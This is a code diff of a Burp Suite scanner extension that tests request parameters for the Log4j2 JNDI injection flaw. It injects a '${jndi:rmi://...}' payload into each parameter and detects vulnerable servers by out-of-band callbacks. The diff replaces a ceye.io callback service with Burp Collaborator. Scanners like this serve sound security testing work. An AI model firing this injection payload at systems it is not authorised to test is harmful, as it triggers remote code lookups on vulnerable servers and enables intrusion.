@@ -1,19 +1,13 @@
 from burp import IBurpExtender
 from burp import IScannerCheck
+from burp import IBurpCollaboratorClientContext
 from burp import IScanIssue
 from java.io import PrintWriter
 from array import array
 import requests
 import re
-from hashlib import md5
-import random
 
-def randmd5():
-    new_md5 = md5()
-    new_md5.update(str(random.randint(1, 1000)))
-    return new_md5.hexdigest()[:6]
-
-class BurpExtender(IBurpExtender, IScannerCheck):
+class BurpExtender(IBurpExtender, IScannerCheck, IBurpCollaboratorClientContext):
 
     #
     # implement IBurpExtender
@@ -37,6 +31,9 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         self.stdout = PrintWriter(callbacks.getStdout(), True)
         self.stderr = PrintWriter(callbacks.getStderr(), True)
 
+        # load Burp's CollaboratorClient, use generatePayload() method to creat a dnslog address
+        self.collaboratorContext = callbacks.createBurpCollaboratorClientContext()
+        self.payload = self.collaboratorContext.generatePayload(True)
         # register ourselves as a custom scanner check
         callbacks.registerScannerCheck(self)
 
@@ -49,28 +46,20 @@ class BurpExtender(IBurpExtender, IScannerCheck):
 
         for parameter in reqParameters:
             parameterName, parameterValue, parameterType = parameter.getName(), parameter.getValue(), parameter.getType()
-            randomStr = randmd5()
             
-            parameterValueRCE = '%24%7Bjndi%3Armi%3A%2F%2F'+ str(randomStr) + '.你的ceye.io地址%2F1%7D'
-            #parameterValueRCE = '${jndi:rmi://'+ str(randomStr) + '.xxx.ceye.io/1}'
+            parameterValueRCE = '%24%7Bjndi%3Armi%3A%2F%2F'+ str(self.payload) +'%2F1%7D'
+            #parameterValueRCE = '${jndi:rmi://'+ str(randomStr) + '.63lhuf.ceye.io/1}'
             newParameter = self._helpers.buildParameter(parameterName, parameterValueRCE, parameterType)
             newRequest = self._helpers.updateParameter(request, newParameter)
-            #print newRequest
             res = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),newRequest)
-            #response = res.getResponse()
-            #analyzedIResponseInfo = self._helpers.analyzeRequest(response)
-            #resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
-            #print resBodys
-            #checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
-            r = requests.get("http://api.ceye.io/v1/records?token=你的ceye.io的token&type=dns&filter=" + str(randomStr))
-            if randomStr in r.text and r.status_code == 200:
+            if self.collaboratorContext.fetchCollaboratorInteractionsFor(self.payload):
                 print "Found Vuln!!!"
                 return [CustomScanIssue(
                     baseRequestResponse.getHttpService(),
                     self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                     [self._callbacks.applyMarkers(baseRequestResponse, None, None)],
                     "Log4j2 JNDI",
-                    'Vuln Parameter is {}'.format(str(parameterName)),
+                    'Vuln Parameter is {} \n Recvieved data from: {}'.format(str(parameterName),str(self.payload)),
                     "High")]
         
         
